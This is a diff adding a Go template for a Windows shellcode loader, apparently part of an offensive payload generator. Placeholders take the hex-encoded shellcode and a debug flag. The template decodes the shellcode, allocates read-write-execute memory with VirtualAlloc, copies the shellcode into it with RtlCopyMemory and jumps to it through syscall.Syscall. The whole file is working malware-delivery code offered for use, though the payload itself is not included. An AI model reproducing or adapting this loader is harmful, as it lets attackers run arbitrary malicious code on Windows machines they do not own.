@@ -1,0 +1,59 @@
+package main
+
+import (
+	"encoding/hex"
+	"syscall"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+<% if debug %>
+import "fmt"
+const DEBUG      = <%= debug %>
+
+func dbg(e error) {
+	if DEBUG {
+		fmt.Println(e.Error())
+	}
+}
+<% else %>
+func dbg(e error) {}
+<% end %>
+
+const (
+	MEM_COMMIT = 0x1000
+	PAGE_RXW   = 0x40
+)
+
+var (
+	ntdll = windows.NewLazySystemDLL("ntdll.dll")
+	RtlCopyMemory = ntdll.NewProc("RtlCopyMemory")
+)
+
+func main() {
+
+	shellcode, err := hex.DecodeString("<%= shellcode %>")
+	if err != nil {
+		dbg(err)
+		syscall.Exit(1)
+	}
+
+	addr, err := windows.VirtualAlloc( 0, uintptr(len(shellcode)), MEM_COMMIT, PAGE_RXW)
+	if err != nil {
+		dbg(err)
+		syscall.Exit(1)
+	}
+
+	r1, _, err := RtlCopyMemory.Call(
+		uintptr(addr),
+		(uintptr)(unsafe.Pointer(&shellcode[0])),
+		uintptr(len(shellcode)),
+	)
+	if r1 == 0 {
+		dbg(err)
+		syscall.Exit(1)
+	}
+
+	syscall.Syscall(addr, 0, 0, 0, 0)
+}
